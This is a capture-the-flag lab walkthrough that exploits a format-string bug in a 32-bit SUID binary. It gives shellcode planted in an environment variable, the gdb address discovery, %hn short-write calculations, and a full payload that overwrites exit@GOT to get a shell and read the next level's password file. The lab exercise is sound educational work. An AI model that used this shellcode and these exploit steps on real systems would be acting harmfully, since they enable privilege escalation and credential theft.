# Level 05 - Practical walkthrough

> 🔓 **Flaw:** format-string bug - `printf(buffer)` with no format specifier, plus `exit(0)`
> 🎯 **Target:** `exit@GOT` (Global Offset Table entry for `exit`)
> 🛠️ **Technique:** put shellcode in an env var (NX-safe), then use `%hn` short writes to overwrite `exit@GOT` with its address.

All commands are run as user `level05`. This binary is **32-bit** with **NX enabled**, so
stack shellcode won't execute - we redirect `exit` into an env-var shellcode instead.

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and behaviour.

🟨 **Terminal:**

```bash
ls -l ./level05
./level05
```

⬜ **Output:**

```text
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
HELLO
hello
```

Owned by `level06` and SUID. It lowercases input and prints it. The unsafe `printf(buffer)`
is the format-string bug; the program then calls `exit(0)`.

🟨 **Terminal:** (confirm NX is on)

```bash
dmesg | grep "Execute Disable"
```

⬜ **Output:**

```text
NX (Execute Disable) protection: active
```

## 2. Plant shellcode in the environment

🟦 **Goal:** store an `execve("/bin/sh")` shellcode, behind a NOP sled, in an env var that
maps into the target's address space.

🟨 **Terminal:**

```bash
export SHELLCODE=$(python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
```

The 100-byte NOP sled (`\x90`) gives us a wide landing zone so the address only has to be
*approximately* right.

## 3. Find the shellcode address

🟦 **Goal:** locate `SHELLCODE` in the target's memory, then aim a bit past the `SHELLCODE=`
prefix into the sled.

🟨 **Terminal:**

```bash
gdb ./level05
```

🟨 **GDB:**

```gdb
break *main+4
run
x/200s environ
```

⬜ **Output (excerpt):**

```text
0xffffd822:  "SHELLCODE=\220\220\220...\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
```

`SHELLCODE=` starts at `0xffffd822`. Skip the 10-char name and a little into the sled:
`0xffffd822 + 16 = 0xffffd832`. (Addresses shift with the environment; re-find yours.)

## 4. Find exit@GOT and the buffer position

🟦 **Goal:** get the GOT entry to overwrite, and which format argument index is our buffer.

🟨 **GDB:**

```gdb
x/i 0x08048370
```

⬜ **Output:**

```text
0x8048370 <exit@plt>:  jmp    *0x80497e0
```

So `exit@GOT` = `0x080497e0`.

🟨 **Terminal:** (find the buffer's argument index)

```bash
python -c 'print "AAAA" + " %x"*12' | ./level05
```

⬜ **Output:**

```text
aaaa 64 f7fcfac0 f7ec3af9 ... 61616161 ...
```

`61616161` (`"aaaa"` - our uppercased "AAAA" comes back lowercased) shows up at the **10th**
argument, so the two halves of our address will be written via `%10$hn` and `%11$hn`.

## 5. Compute the short writes

🟦 **Goal:** `%n`/`%hn` writes "the number of chars printed so far". We write the address
`0xffffd832` in two 16-bit halves at `exit@GOT` (low half) and `exit@GOT+2` (high half).

```text
shellcode addr 0xffffd832  ->  low  0xd832 = 55346
                               high 0xffff = 65535

We first print 8 bytes (the two 4-byte GOT addresses at the front), so:
  first  %hn value = 55346 - 8      = 55338
  second %hn value = 65535 - 55346  = 10189
```

## 6. Build and run the exploit

🟦 **Goal:** front-load the two GOT addresses, then pad to the right counts and fire the
`%hn` writes.

```text
[ exit@GOT ] [ exit@GOT+2 ] "%55338d" "%10$hn" "%10189d" "%11$hn"
```

🟨 **Terminal:**

```bash
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
```

🟨 **In the shell:**

```bash
whoami
cat /home/users/level06/.pass
```

⬜ **Output:**

```text
level06
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

> The `Ressources/getenv.c` helper prints the runtime address of `SHELLCODE`, an alternative
> to reading it from `x/200s environ` in gdb.

## 7. Move to the next level

🟨 **Terminal:**

```bash
su level06
```

(Enter the password above.) Then:

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level06
```
